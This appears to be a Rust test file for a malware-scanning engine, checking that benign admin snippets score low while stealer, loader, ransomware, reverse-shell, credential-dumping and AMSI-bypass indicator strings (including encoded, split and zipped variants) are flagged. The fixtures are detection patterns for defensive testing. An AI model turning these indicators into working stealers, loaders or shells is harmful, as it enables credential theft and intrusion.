//! Inert synthetic fixtures: never execute these strings or fetch payloads.
use super::*;
use base64::{Engine as _, engine::general_purpose::STANDARD};

fn engine() -> Engine {
    let (rules, rule_errors) = RuleSet::load(None);
    assert!(rule_errors.is_empty());
    Engine {
        rules,
        rule_errors,
        blocklist: HashSet::new(),
        allowlist: HashSet::new(),
        mb_key: String::new(),
        mb_cache: Mutex::new(HashMap::new()),
        agent: ureq::Agent::new_with_defaults(),
    }
}

fn score(engine: &Engine, name: &str, text: &str, kind: Kind) -> (i32, Vec<Finding>) {
    let (_, mut findings) = engine.analyze_buffer(name, text.as_bytes(), kind, 0);
    findings.extend(filetype::name_findings(name, kind));
    (findings.iter().map(|f| f.weight).sum(), findings)
}

#[test]
fn benign_programs_and_admin_scripts_stay_below_alert_threshold() {
    let engine = engine();
    let cases = [
        ("backup.ps1", "vssadmin delete shadows /oldest", Kind::Script),
        ("enable.ps1", "Set-MpPreference -DisableRealtimeMonitoring $false", Kind::Script),
        ("admin.ps1", "Add-MpPreference -ExclusionPath C:\\build", Kind::Script),
        (
            "download.ps1",
            "New-Object Net.WebClient; DownloadFile('https://example.invalid/file'); [Convert]::FromBase64String('YWJj')",
            Kind::Script,
        ),
        ("helper.js", "WScript.Shell ActiveXObject Scripting.FileSystemObject WScript.CreateObject", Kind::Script),
        ("health.ps1", "MsMpEng.exe avp.exe MBAMService bdagent.exe ekrn.exe", Kind::Script),
        ("client.exe", "discordcanary discordptb \\discord\\Local Storage\\leveldb", Kind::Pe),
        ("steam.exe", "loginusers.vdf \\Steam\\config\\ config\\config.vdf", Kind::Pe),
        (
            "browser.exe",
            "\\Login Data \\Local State encrypted_key CryptUnprotectData \\Google\\Chrome\\User Data \\Microsoft\\Edge\\User Data \\BraveSoftware\\Brave-Browser",
            Kind::Pe,
        ),
        ("mining.exe", "xmrig cryptonight stratum+tcp://example.invalid --donate-level", Kind::Pe),
        ("reference.py", "AsyncRAT RedLine Stealer XWorm xmrig -ExclusionPath DisableAntiSpyware", Kind::Script),
        ("terminal.lnk", "powershell.exe", Kind::Shortcut),
        ("notifier.py", "api.telegram.org/bot api.ipify.org", Kind::Script),
        ("desktop.exe", "GetAsyncKeyState GetForegroundWindow GetWindowText WriteFile \\CurrentVersion\\Run", Kind::Pe),
    ];
    for (name, text, kind) in cases {
        let (score, findings) = score(&engine, name, text, kind);
        assert!(score < SUSPICIOUS, "{name}: {score} {findings:?}");
    }
}

#[test]
fn common_malware_capability_combinations_are_detected() {
    let engine = engine();
    let cases = [
        ("steal.py", "\\Login Data encrypted_key CryptUnprotectData api.telegram.org/bot", MALICIOUS),
        ("tokens.js", "dQw4w9WgXcQ: \\discord\\Local Storage\\leveldb discord.com/api/webhooks/", MALICIOUS),
        ("wallet.py", "wallet.dat \\Electrum\\wallets discord.com/api/webhooks/", MALICIOUS),
        ("loader.ps1", "Invoke-Expression DownloadString( Add-MpPreference -ExclusionPath", MALICIOUS),
        ("ransom.cmd", "vssadmin delete shadows your files have been encrypted bitcoin", MALICIOUS),
        ("shell.ps1", "Net.Sockets.TCPClient GetStream( Invoke-Expression .Write(", SUSPICIOUS),
        ("keys.py", "GetAsyncKeyState GetForegroundWindow WriteFile api.telegram.org/bot", MALICIOUS),
        ("dump.ps1", "privilege::debug sekurlsa::logonpasswords", SUSPICIOUS),
        ("drop.js", "MSXML2.XMLHTTP ADODB.Stream WScript.Shell .Run(", SUSPICIOUS),
        ("memory.ps1", "FromBase64String [Reflection.Assembly]::Load( .EntryPoint.Invoke( AmsiUtils amsiInitFailed SetValue(", MALICIOUS),
    ];
    for (name, text, threshold) in cases {
        let (score, findings) = score(&engine, name, text, Kind::Script);
        assert!(score >= threshold, "{name}: {score} {findings:?}");
    }
}

#[test]
fn encoded_and_split_payloads_retain_verdict_without_duplicate_points() {
    let engine = engine();
    let payload = "Invoke-Expression DownloadString( Add-MpPreference -ExclusionPath";
    let plain = score(&engine, "payload.ps1", payload, Kind::Script).0;
    let wide: Vec<u8> = payload.encode_utf16().flat_map(u16::to_le_bytes).collect();
    let encoded = format!("powershell -EncodedCommand {}", STANDARD.encode(wide));
    let (encoded_score, findings) = score(&engine, "payload.ps1", &encoded, Kind::Script);
    assert_eq!(plain, encoded_score);
    assert!(findings.iter().any(|f| f.title.contains("recovered from")));
    let repeated = format!("{payload}; {encoded}; {encoded}");
    assert_eq!(plain, score(&engine, "payload.ps1", &repeated, Kind::Script).0);
    let split = "'Inv' + 'oke-Expression' ('Down' + 'loadString('); Add-MpPreference -ExclusionPath";
    assert_eq!(plain, score(&engine, "payload.ps1", split, Kind::Script).0);
    let caret = "Inv^oke-Expression Down^loadString( Add-MpPreference -ExclusionPath";
    assert_eq!(plain, score(&engine, "payload.cmd", caret, Kind::Script).0);
    let dynamic =
        "$p = $client.('Down' + 'loadString')('https://example.invalid'); & ('I' + 'EX') $p; Add-MpPreference -ExclusionPath C:\\build";
    assert_eq!(plain, score(&engine, "payload.ps1", dynamic, Kind::Script).0);
}

#[test]
fn benign_obfuscation_is_not_evidence_of_malware() {
    let engine = engine();
    let payload = "Write-Output 'Hello from an encoded deployment script'";
    let encoded = format!("powershell -enc {}", STANDARD.encode(payload));
    assert!(score(&engine, "deploy.ps1", &encoded, Kind::Script).0 < SUSPICIOUS);
    let bundle = format!("const image='data:image/png;base64,{}'; {}", "A".repeat(8000), "String.fromCharCode(65);".repeat(50));
    assert!(score(&engine, "bundle.js", &bundle, Kind::Script).0 < SUSPICIOUS);
    assert!(score(&engine, "chars.cmd", &"echo ^a ".repeat(100), Kind::Script).0 < SUSPICIOUS);
}

#[test]
fn python_extensions_are_scanned() {
    for ext in ["py", "pyw"] {
        assert!(filetype::is_code_ext(ext));
        assert_eq!(filetype::classify(&format!("script.{ext}"), b"import os"), Kind::Script);
    }
}

#[test]
fn zip_members_use_the_same_decoding_and_scoring() {
    use std::io::{Cursor, Write};
    let payload = "Invoke-Expression DownloadString( Add-MpPreference -ExclusionPath";
    let encoded = format!("powershell -enc {}", STANDARD.encode(payload));
    let mut zip = zip::ZipWriter::new(Cursor::new(Vec::new()));
    zip.start_file("payload.ps1", zip::write::SimpleFileOptions::default()).unwrap();
    zip.write_all(encoded.as_bytes()).unwrap();
    let data = zip.finish().unwrap().into_inner();
    let (score, findings) = engine().analyze_buffer("delivery.zip", &data, Kind::Zip, 0);
    assert!(score >= MALICIOUS, "{findings:?}");
    assert!(findings.iter().any(|f| f.title.contains("payload.ps1") && f.title.contains("recovered from")));
}
